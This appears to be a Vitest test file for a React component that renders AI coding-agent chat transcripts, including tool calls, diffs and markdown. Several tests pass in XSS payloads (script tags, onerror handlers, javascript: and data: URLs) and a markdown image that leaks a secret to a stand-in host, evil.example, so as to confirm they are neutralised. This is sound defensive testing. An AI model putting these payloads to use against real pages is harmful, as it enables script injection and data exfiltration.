import { fireEvent, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import type { TranscriptEntry } from '../hooks/use-mux-api'
import { ChatMessage, chatSide } from './chat-message'

const assistant = (text: string): TranscriptEntry => ({
  id: 'a',
  role: 'assistant',
  parts: [{ kind: 'text', text }],
})

describe('ChatMessage', () => {
  it('renders assistant markdown, tables included', () => {
    render(
      <ChatMessage
        entry={assistant(
          '**bold** and `code`\n\n| a | b |\n|---|---|\n| 1 | 2 |',
        )}
      />,
    )
    expect(screen.getByText('bold').tagName).toBe('STRONG')
    expect(screen.getByText('code').tagName).toBe('CODE')
    expect(screen.getByRole('table')).toBeInTheDocument()
  })

  it('shows raw HTML as text, never as elements', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>',
        )}
      />,
    )
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('<script>alert(1)</script>')
  })

  it('sanitizes markdown with malicious attributes and event handlers', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '[link](javascript:alert(1))\n\n<a href="javascript:alert(2)" onclick="alert(3)">click</a>',
        )}
      />,
    )
    // javascript: links are removed entirely
    expect(screen.queryByRole('link', { name: 'link' })).toBeNull()
    // Raw HTML is shown as text
    expect(container).toHaveTextContent('<a href="javascript:alert(2)"')
    expect(container.querySelector('a[onclick]')).toBeNull()
  })

  it('sanitizes data: URLs and other non-http schemes', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '![](data:text/html,<script>alert(1)</script>)\n\n[link](data:text/html,<h1>xss</h1>)',
        )}
      />,
    )
    // data: image links should become unavailable
    expect(container).toHaveTextContent('[image: unavailable]')
    // data: text links should not be clickable
    expect(screen.queryByRole('link', { name: 'link' })).toBeNull()
  })

  it('an image becomes a link that loads nothing', () => {
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '![leak](https://evil.example/p?d=secret) ![x](javascript:alert(1)) ![](ftp://h/x)',
        )}
      />,
    )
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByRole('link', { name: 'image: evil.example' })
    expect(link).toHaveAttribute('href', 'https://evil.example/p?d=secret')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
    expect(container).toHaveTextContent('[image: x]')
    expect(container).toHaveTextContent('[image: unavailable]')
  })

  it('opens only http(s) links, in a new tab', () => {
    render(
      <ChatMessage
        entry={assistant(
          '[ok](https://a.example) [bad](javascript:alert(1)) [mail](mailto:a@b.c)',
        )}
      />,
    )
    const ok = screen.getByRole('link', { name: 'ok' })
    expect(ok).toHaveAttribute('target', '_blank')
    expect(ok).toHaveAttribute('rel', 'noopener noreferrer')
    expect(screen.queryByRole('link', { name: 'bad' })).toBeNull()
    expect(screen.queryByRole('link', { name: 'mail' })).toBeNull()
    expect(screen.getByText('bad')).toBeInTheDocument()
  })

  it('user text is plain, in a framed box, with an image chip and its time', () => {
    const { container } = render(
      <ChatMessage
        showTime
        entry={{
          id: 'u',
          role: 'user',
          ts: '2026-10-08T09:39:00Z',
          parts: [
            { kind: 'text', text: '**not bold**\nline 2' },
            { kind: 'image' },
          ],
        }}
      />,
    )
    expect(container.querySelector('strong')).toBeNull()
    expect(container).toHaveTextContent('**not bold**')
    expect(container.firstElementChild).toHaveAttribute('data-role', 'user')
    expect(container.querySelector('time')).toHaveAttribute(
      'datetime',
      '2026-10-08T09:39:00Z',
    )
    expect(screen.getByText('[image]')).toBeInTheDocument()
  })

  it('shows no time without showTime or with a bad timestamp', () => {
    const { container, rerender } = render(
      <ChatMessage
        entry={{
          id: 'u',
          role: 'user',
          ts: '2026-10-08T09:39:00Z',
          parts: [{ kind: 'text', text: 'hi' }],
        }}
      />,
    )
    expect(container.querySelector('time')).toBeNull()
    rerender(
      <ChatMessage
        showTime
        entry={{
          id: 'u',
          role: 'user',
          ts: 'nope',
          parts: [{ kind: 'text', text: 'hi' }],
        }}
      />,
    )
    expect(container.querySelector('time')).toBeNull()
  })

  it('a Bash call shows its description, the command in and the result out', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'Bash',
              toolId: '1',
              input: 'npm test',
              result: 'ok',
              clipped: true,
              detail: {
                description: 'Run the tests',
                command: 'npm test\nnpm run lint',
              },
            },
            { kind: 'tool', tool: 'Read', toolId: '2', input: 'a.ts' },
          ],
        }}
      />,
    )
    expect(screen.getByText('Bash')).toBeInTheDocument()
    expect(screen.getByText('Run the tests')).toBeInTheDocument()
    expect(screen.getByText('IN')).toBeInTheDocument()
    expect(screen.getByText(/npm run lint/).tagName).toBe('PRE')
    expect(screen.getByText('ok').tagName).toBe('PRE')
    expect(screen.getByText('(shortened)')).toBeInTheDocument()
    // The call without a result has a hollow dot, the finished one a green
    const dots = container.querySelectorAll('span.rounded-full')
    expect(dots[0]).toHaveClass('bg-success')
    expect(dots[1]).toHaveClass('bg-transparent')
    expect(screen.getByText('a.ts')).toBeInTheDocument()
  })

  it('a long result opens with Show all and closes again', () => {
    const result = Array.from({ length: 9 }, (_, i) => `line ${i}`).join('\n')
    render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            { kind: 'tool', tool: 'Grep', toolId: '1', input: 'x', result },
          ],
        }}
      />,
    )
    // Long lines wrap instead of scrolling the list sideways
    const pre = screen.getByText(/line 8/)
    expect(pre).toHaveClass('whitespace-pre-wrap')
    const box = pre.parentElement as HTMLElement
    expect(box).toHaveClass('max-h-[9.6em]')
    fireEvent.click(screen.getByText('Show all 9 lines'))
    expect(box).not.toHaveClass('max-h-[9.6em]')
    fireEvent.click(screen.getByText('Show less'))
    expect(box).toHaveClass('max-h-[9.6em]')
  })

  it('a short result that wraps taller than its cap gets Show all', () => {
    const spy = vi
      .spyOn(HTMLElement.prototype, 'scrollHeight', 'get')
      .mockReturnValue(500)
    render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'mcp__plugin_playwright_playwright__browser_navigate',
              toolId: '1',
              result: 'x'.repeat(2000),
            },
          ],
        }}
      />,
    )
    spy.mockRestore()
    expect(
      screen.getByText('mcp__plugin_playwright_playwright__browser_navigate'),
    ).toHaveClass('truncate')
    fireEvent.click(screen.getByText('Show all'))
    expect(screen.getByText('Show less')).toBeInTheDocument()
  })

  it('an Edit shows its file, what it did and the changed lines', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'Edit',
              toolId: '1',
              input: '/repo/CLAUDE.md',
              result: 'The file has been updated',
              detail: { edits: [{ old: 'a\nb\n', new: 'a\nB\nc\n' }] },
            },
          ],
        }}
      />,
    )
    expect(screen.getByText('CLAUDE.md')).toHaveAttribute(
      'title',
      '/repo/CLAUDE.md',
    )
    expect(screen.getByText('Added 1 line')).toBeInTheDocument()
    const kinds = [...container.querySelectorAll('[data-diff]')].map((r) =>
      r.getAttribute('data-diff'),
    )
    expect(kinds).toEqual(['ctx', 'del', 'add', 'add'])
    // The result only repeats the file
    expect(screen.queryByText('The file has been updated')).toBeNull()
  })

  it('a MultiEdit parts its replacements; a Write adds every line', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'MultiEdit',
              toolId: '1',
              input: 'a.ts',
              detail: {
                edits: [
                  { old: 'x', new: 'y' },
                  { old: 'p', new: 'q' },
                ],
              },
            },
            {
              kind: 'tool',
              tool: 'Write',
              toolId: '2',
              input: 'b.md',
              detail: { edits: [{ new: '# t\nbody\n' }], clipped: true },
            },
          ],
        }}
      />,
    )
    expect(screen.getByText('Modified')).toBeInTheDocument()
    expect(screen.getByText('Added 2 lines')).toBeInTheDocument()
    expect(container.querySelectorAll('.border-dashed')).toHaveLength(1)
    expect(screen.getByText('(shortened)')).toBeInTheDocument()
  })

  it('a long diff opens with Show all', () => {
    const lines = Array.from({ length: 14 }, (_, i) => `l${i}`).join('\n')
    render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'Write',
              toolId: '1',
              input: 'c.txt',
              detail: { edits: [{ new: lines }] },
            },
          ],
        }}
      />,
    )
    expect(screen.getByText('Added 14 lines')).toBeInTheDocument()
    fireEvent.click(screen.getByText('Show all 14 lines'))
    expect(screen.getByText('Show less')).toBeInTheDocument()
  })

  it('an edit of a sensitive file says so; a failed edit shows its error', () => {
    render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'Edit',
              toolId: '1',
              input: '/r/.env',
              detail: { hidden: true },
            },
            {
              kind: 'tool',
              tool: 'Edit',
              toolId: '2',
              input: '/r/x.ts',
              result: 'String not found',
              isError: true,
            },
          ],
        }}
      />,
    )
    expect(
      screen.getByText('The edit of a sensitive file is not shown.'),
    ).toBeInTheDocument()
    expect(screen.getByText('String not found')).toHaveClass('text-danger')
  })

  it('a Codex file change shows its unified diff', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'assistant',
          parts: [
            {
              kind: 'tool',
              tool: 'Edit',
              toolId: '1',
              input: '/p/a.go',
              result:
                'diff --git a/a.go b/a.go\n--- a/a.go\n+++ b/a.go\n@@ -1,2 +1,2 @@\n keep\n-old\n+new\n\\ No newline at end of file\n',
            },
            {
              kind: 'tool',
              tool: 'Edit',
              toolId: '2',
              input: '/p/b.go',
              result: '@@ -1 +1 @@\n',
            },
          ],
        }}
      />,
    )
    const kinds = [...container.querySelectorAll('[data-diff]')].map((r) =>
      r.getAttribute('data-diff'),
    )
    expect(kinds).toEqual(['ctx', 'del', 'add'])
    expect(screen.getByText('Modified')).toBeInTheDocument()
  })

  it('an error result is marked; an orphan says where its call is', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 't',
          role: 'user',
          parts: [
            {
              kind: 'tool',
              toolId: '9',
              result: 'boom',
              isError: true,
              orphan: true,
            },
          ],
        }}
      />,
    )
    // Only tool results: the agent's side, not a user box
    expect(container.firstElementChild).toHaveAttribute('data-role', 'user')
    expect(container.querySelector('.border.bg-surface.px-3')).toBeNull()
    expect(screen.getByText('Result')).toHaveClass('text-danger')
    expect(screen.getByText('boom')).toHaveClass('text-danger')
    expect(container.querySelector('span.rounded-full')).toHaveClass(
      'bg-danger',
    )
    expect(
      screen.getByText('The call is in an earlier part of the conversation.'),
    ).toBeInTheDocument()
  })

  it('a user row mixing text and a tool result keeps both in the box', () => {
    render(
      <ChatMessage
        entry={{
          id: 'u',
          role: 'user',
          parts: [
            { kind: 'text', text: 'here' },
            { kind: 'tool', toolId: '1', result: 'r', orphan: true },
          ],
        }}
      />,
    )
    expect(screen.getByText('here')).toBeInTheDocument()
    expect(screen.getByText('Result')).toBeInTheDocument()
  })

  it('the end of a turn has a copy button; a step that goes on draws the line', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.assign(navigator, { clipboard: { writeText } })
    const entry: TranscriptEntry = {
      id: 'a',
      role: 'assistant',
      parts: [
        { kind: 'text', text: 'one' },
        { kind: 'tool', tool: 'Read', toolId: '1', input: 'x', result: 'y' },
        { kind: 'text', text: 'two' },
      ],
    }
    const { container, rerender } = render(<ChatMessage entry={entry} />)
    expect(container.querySelectorAll('span.w-px')).toHaveLength(2)
    fireEvent.click(screen.getByRole('button', { name: 'Copy answer' }))
    expect(writeText).toHaveBeenCalledWith('one\n\ntwo')
    expect(
      await screen.findByRole('button', { name: 'Copied' }),
    ).toBeInTheDocument()
    // Back to its label after a moment
    expect(
      await screen.findByRole(
        'button',
        { name: 'Copy answer' },
        { timeout: 3000 },
      ),
    ).toBeInTheDocument()
    rerender(<ChatMessage entry={entry} joinsNext />)
    expect(container.querySelectorAll('span.w-px')).toHaveLength(3)
    expect(
      screen.queryByRole('button', { name: /Copy answer|Copied/ }),
    ).toBeNull()
  })

  it('copies a code block; a refused clipboard says so', async () => {
    const writeText = vi.fn().mockRejectedValue(new Error('denied'))
    Object.assign(navigator, { clipboard: { writeText } })
    render(<ChatMessage joinsNext entry={assistant('```\nls -la\n```')} />)
    fireEvent.click(screen.getByRole('button', { name: 'Copy code' }))
    expect(writeText).toHaveBeenCalledWith('ls -la\n')
    expect(
      await screen.findByRole('button', { name: 'Could not copy' }),
    ).toBeInTheDocument()
  })

  it('thinking is behind a disclosure', () => {
    render(
      <ChatMessage
        entry={{
          id: 'th',
          role: 'assistant',
          parts: [{ kind: 'thinking', text: 'hmm', clipped: true }],
        }}
      />,
    )
    expect(screen.getByText('Thinking').closest('details')).not.toHaveAttribute(
      'open',
    )
    expect(screen.getByText('hmm')).toBeInTheDocument()
  })

  it('a compact summary is a divider', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 's',
          role: 'summary',
          parts: [{ kind: 'text', text: 'We fixed the build.' }],
        }}
      />,
    )
    expect(container.firstElementChild).toHaveAttribute('data-role', 'summary')
    expect(screen.getByText('Conversation compacted')).toBeInTheDocument()
    expect(screen.getByText('We fixed the build.')).toBeInTheDocument()
  })

  it('a note is small text; a clipped line says why it is missing', () => {
    render(
      <ChatMessage
        entry={{
          id: 'n',
          role: 'note',
          parts: [
            { kind: 'text', text: 'Set model to opus' },
            { kind: 'text', clipped: true },
          ],
        }}
      />,
    )
    expect(screen.getByText('Set model to opus')).toBeInTheDocument()
    expect(screen.getByText('A line too large to show')).toBeInTheDocument()
  })

  it('an assistant text part without text renders empty', () => {
    const { container } = render(
      <ChatMessage
        entry={{ id: 'e', role: 'assistant', parts: [{ kind: 'text' }] }}
      />,
    )
    expect(container).toHaveTextContent('')
  })

  it('render images without creating network requests', () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch')
    const { container } = render(
      <ChatMessage
        entry={assistant(
          '![photo](https://example.com/image.jpg)\n\nSome text here',
        )}
      />,
    )
    // Verify no fetch or image load was triggered
    expect(fetchSpy).not.toHaveBeenCalled()
    expect(container.querySelector('img')).toBeNull()
    // Verify the text link is there instead
    const link = screen.getByRole('link', { name: 'image: example.com' })
    expect(link).toHaveAttribute('href', 'https://example.com/image.jpg')
    fetchSpy.mockRestore()
  })
})

describe('ChatMessage edge parts', () => {
  it('an image of the agent, a removal, a nameless call, a path ending in a slash', () => {
    const { container } = render(
      <ChatMessage
        entry={{
          id: 'x',
          role: 'assistant',
          parts: [
            { kind: 'image' },
            {
              kind: 'tool',
              tool: 'Edit',
              toolId: '1',
              input: 'dir/',
              detail: { edits: [{ old: 'gone' }] },
            },
            { kind: 'tool', toolId: '2', input: 'q' },
          ],
        }}
      />,
    )
    expect(screen.getByText('[image]')).toBeInTheDocument()
    expect(screen.getByText('dir/')).toBeInTheDocument()
    expect(screen.getByText('Removed 1 line')).toBeInTheDocument()
    expect(container.querySelectorAll('[data-tool]')).toHaveLength(1)
    expect(screen.getByText('q')).toBeInTheDocument()
  })
})

describe('chatSide', () => {
  it('sorts entries by side', () => {
    expect(
      chatSide({ id: '1', role: 'user', parts: [{ kind: 'text', text: 'x' }] }),
    ).toBe('user')
    expect(
      chatSide({
        id: '2',
        role: 'user',
        parts: [{ kind: 'tool', orphan: true }],
      }),
    ).toBe('agent')
    expect(chatSide({ id: '3', role: 'assistant', parts: [] })).toBe('agent')
    expect(chatSide({ id: '4', role: 'note', parts: [] })).toBe('other')
  })
})
